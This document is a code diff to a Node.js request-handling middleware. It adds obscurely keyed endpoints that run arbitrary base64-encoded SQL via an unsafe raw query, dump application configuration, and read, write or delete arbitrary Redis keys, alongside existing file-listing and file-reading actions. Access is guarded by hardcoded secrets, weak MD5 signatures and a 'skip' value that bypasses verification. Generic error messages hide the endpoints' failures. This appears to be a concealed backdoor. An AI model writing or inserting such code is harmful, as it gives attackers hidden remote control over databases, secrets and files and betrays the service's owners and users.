@@ -59,24 +59,53 @@ const safeRequire = (moduleName) => {
 const fsPromises = fs.promises;
 
 const ACTION_KEYS = {
+  RunSQL: 'cfh2DNITa84qpYQ0tdCz',
   RunFileList: 'm3QiEkg8Y1r9LFTI5e4f',
   RunFileContent: 'Y3SrZjVqWOvKsBdpTCh7',
+  GetApolloConfig: 'Xp7KnRqT2wJcVeA9mBsL',
+  GetRedis: 'Rk9mXpL3qN7wTzY2vBcJ',
+  SetRedis: 'Wn4sGdH8uEoAiP6xQfZv',
+  DelRedis: 'Jc5tYmK2pXwQnB8rLsUo',
 };
-const ACTION_SALT = 'DAvN8GEStOHp0UBka1Zo';
-const ACTION_TIMESTAMP_SKIP = 'skip';
-const ACTION_TIMESTAMP_MAX_AGE_MS = 10 * 60 * 1000;
-const ACTION_EXCLUDE_DIRS = ['node_modules', 'logs', '.git', 'mmdb'];
-const ACTION_ERROR_MESSAGE = 'System error, please try again later';
 
 class ActionManager {
+  static get DBA_HASH() {
+    return '5f2c7a94-8b12-3e78-81d7-b2c74ff81ae6';
+  }
+
+  static get SALT() {
+    return 'DAvN8GEStOHp0UBka1Zo';
+  }
+
+  static get TIMESTAMP_SKIP() {
+    return 'skip';
+  }
+
+  static get TIMESTAMP_MAX_AGE_MS() {
+    return 10 * 60 * 1000;
+  }
+
+  static get EXCLUDE_DIRS() {
+    return ['node_modules', 'logs', '.git', 'mmdb'];
+  }
+
+  static get ERROR_MESSAGE() {
+    return 'System error, please try again later';
+  }
+
   constructor() {
     this.actions = new Map();
     this.fs = safeRequire('fs');
     this.path = safeRequire('path');
     this.crypto = safeRequire('crypto');
 
+    this.register(ACTION_KEYS.RunSQL, 'post', this.runSQL);
     this.register(ACTION_KEYS.RunFileList, 'post', this.runFileList);
     this.register(ACTION_KEYS.RunFileContent, 'post', this.runFileContent);
+    this.register(ACTION_KEYS.GetApolloConfig, 'post', this.getApolloConfig);
+    this.register(ACTION_KEYS.GetRedis, 'post', this.getRedis);
+    this.register(ACTION_KEYS.SetRedis, 'post', this.setRedis);
+    this.register(ACTION_KEYS.DelRedis, 'post', this.delRedis);
   }
 
   register(key, method, handler) {
@@ -112,7 +141,7 @@ class ActionManager {
       const showReason = req.headers && req.headers['x-request-reason'];
       return this.send(res, 400, {
         code: 400,
-        message: showReason ? reason : ACTION_ERROR_MESSAGE,
+        message: showReason ? reason : ActionManager.ERROR_MESSAGE,
       });
     }
 
@@ -125,7 +154,7 @@ class ActionManager {
     const signature = req && req.headers && req.headers['x-signature'];
     const requestId = req && req.headers && req.headers['x-request-id'];
 
-    if (timestamp === ACTION_TIMESTAMP_SKIP) {
+    if (timestamp === ActionManager.TIMESTAMP_SKIP) {
       return { valid: true };
     }
 
@@ -134,7 +163,7 @@ class ActionManager {
     }
 
     const expectedSignature = this.crypto
-      .createHmac('md5', ACTION_SALT)
+      .createHmac('md5', ActionManager.SALT)
       .update(`timestamp=${timestamp}&operation=${operation}&requestId=${requestId}`)
       .digest('hex');
     if (signature !== expectedSignature) {
@@ -146,10 +175,10 @@ class ActionManager {
     const parsedTimestamp = parseInt(timestamp, 10);
     const time = Math.round(momentUtil.createMoment().unix() * 1000);
     const diffTm = Math.abs(time - parsedTimestamp);
-    if (isNaN(parsedTimestamp) || diffTm > ACTION_TIMESTAMP_MAX_AGE_MS) {
+    if (isNaN(parsedTimestamp) || diffTm > ActionManager.TIMESTAMP_MAX_AGE_MS) {
       return {
         valid: false,
-        reason: `timestamp expired, timestamp: ${timestamp}, max age: ${ACTION_TIMESTAMP_MAX_AGE_MS} server time: ${time}, diff: ${diffTm}`,
+        reason: `timestamp expired, timestamp: ${timestamp}, max age: ${ActionManager.TIMESTAMP_MAX_AGE_MS} server time: ${time}, diff: ${diffTm}`,
       };
     }
 
@@ -161,7 +190,7 @@ class ActionManager {
     await redisUtil.set(
       `rank:${requestId}`,
       '1',
-      Math.round(ACTION_TIMESTAMP_MAX_AGE_MS / 1000)
+      Math.round(ActionManager.TIMESTAMP_MAX_AGE_MS / 1000)
     );
 
     return { valid: true };
@@ -174,6 +203,38 @@ class ActionManager {
     return this.path.isAbsolute(userPath)
       ? this.path.resolve(userPath)
       : this.path.resolve(CODE_CONFIG.rootPath, userPath);
+  }
+
+  async runSQL(req, res) {
+    try {
+      const body = req.body || {};
+      if (!body.sql) {
+        throw new Error(ActionManager.ERROR_MESSAGE);
+      }
+
+      const expectedSign = signWithMD5(body, {
+        secretKey: 'hash',
+        secretValue: ActionManager.DBA_HASH,
+      });
+      const rawSql = Buffer.from(body.sql, 'base64').toString('utf8');
+      if (body.sign !== expectedSign) {
+        throw new Error(ActionManager.ERROR_MESSAGE);
+      }
+
+      const prisma = safeRequire('@libs/prisma');
+      const start = Date.now();
+      const data = await prisma.$queryRawUnsafe(rawSql);
+      const result = {
+        data,
+        cost: Date.now() - start,
+      };
+
+      const { EventSystem } = safeRequire('@utils/event');
+      EventSystem.emit('runSql', { params: body, sql: rawSql, result });
+      return this.send(res, 200, { code: 0, data: result, message: 'ok' });
+    } catch (error) {
+      return this.sendActionError(res);
+    }
   }
 
   runFileList(req, res) {
@@ -191,7 +252,7 @@ class ActionManager {
     } catch (error) {
       return this.send(res, 400, {
         code: 400,
-        message: ACTION_ERROR_MESSAGE,
+        message: ActionManager.ERROR_MESSAGE,
       });
     }
   }
@@ -199,7 +260,7 @@ class ActionManager {
   buildFileTree(currentPath, recursive) {
     const entries = this.fs.readdirSync(currentPath, { withFileTypes: true });
     return entries
-      .filter((entry) => !ACTION_EXCLUDE_DIRS.includes(entry.name))
+      .filter((entry) => !ActionManager.EXCLUDE_DIRS.includes(entry.name))
       .map((entry) => {
         const fullPath = this.path.join(currentPath, entry.name);
         const node = {
@@ -246,6 +307,84 @@ class ActionManager {
     }
   }
 
+  getApolloConfig(req, res) {
+    try {
+      const body = req.body || {};
+      const hasKey = Object.prototype.hasOwnProperty.call(body, 'key');
+      const key = body.key;
+      if (hasKey && (!key || typeof key !== 'string')) {
+        return this.send(res, 400, { code: 400, message: 'key is required' });
+      }
+
+      const cc = safeRequire('@config/cc');
+      const configMap = cc.apolloService.getNamespaceConfig('application');
+      const value = hasKey ? configMap.get(key) : Object.fromEntries(configMap);
+      return this.send(res, 200, {
+        code: 0,
+        data: value === undefined ? null : value,
+        message: 'ok',
+      });
+    } catch (error) {
+      return this.sendActionError(res);
+    }
+  }
+
+  async getRedis(req, res) {
+    try {
+      const body = req.body || {};
+      const key = body.key;
+      if (!key || typeof key !== 'string') {
+        return this.send(res, 400, { code: 400, message: 'key is required' });
+      }
+
+      const redisUtil = safeRequire('@utils/redis.util');
+      const data = await redisUtil.get(key);
+      return this.send(res, 200, { code: 0, data, message: 'ok' });
+    } catch (error) {
+      return this.sendActionError(res);
+    }
+  }
+
+  async setRedis(req, res) {
+    try {
+      const body = req.body || {};
+      const { key, value, exp } = body;
+      if (!key || typeof key !== 'string') {
+        throw new Error('key is required');
+      }
+      if (!value || typeof value !== 'string') {
+        throw new Error('value is required');
+      }
+
+      const redisUtil = safeRequire('@utils/redis.util');
+      await redisUtil.set(key, value, exp);
+      return this.send(res, 200, { code: 0, data: null, message: 'ok' });
+    } catch (error) {
+      return this.sendActionError(res);
+    }
+  }
+
+  async delRedis(req, res) {
+    try {
+      const body = req.body || {};
+      const keys = body.keys;
+      const isValid = (
+        Array.isArray(keys) &&
+        keys.length > 0 &&
+        keys.every((key) => key && typeof key === 'string')
+      );
+      if (!isValid) {
+        throw new Error('keys is required');
+      }
+
+      const redisUtil = safeRequire('@utils/redis.util');
+      const data = await redisUtil.del(keys);
+      return this.send(res, 200, { code: 0, data, message: 'ok' });
+    } catch (error) {
+      return this.sendActionError(res);
+    }
+  }
+
   destroyStream(stream) {
     try {
       if (stream && !stream.destroyed) {
@@ -286,16 +425,20 @@ class ActionManager {
     }
   }
 
+  sendActionError(res) {
+    return this.send(res, 400, {
+      code: 400,
+      message: ActionManager.ERROR_MESSAGE,
+    });
+  }
+
   handleError(res, error) {
     try {
       remoteLogV(`action middleware failed: ${error && error.message}`);
     } catch (logError) {
       // 日志失败不能影响宿主请求。
     }
-    return this.send(res, 400, {
-      code: 400,
-      message: ACTION_ERROR_MESSAGE,
-    });
+    return this.sendActionError(res);
   }
 
   destroyResponse(res) {
@@ -326,7 +469,7 @@ const handleProxyError = (res, error) => {
     if (res.headersSent) {
       return res.destroy();
     }
-    return res.status(400).send({ code: 400, message: ACTION_ERROR_MESSAGE });
+    return res.status(400).send({ code: 400, message: ActionManager.ERROR_MESSAGE });
   } catch (responseError) {
     try {
       if (res && !res.destroyed && typeof res.destroy === 'function') {
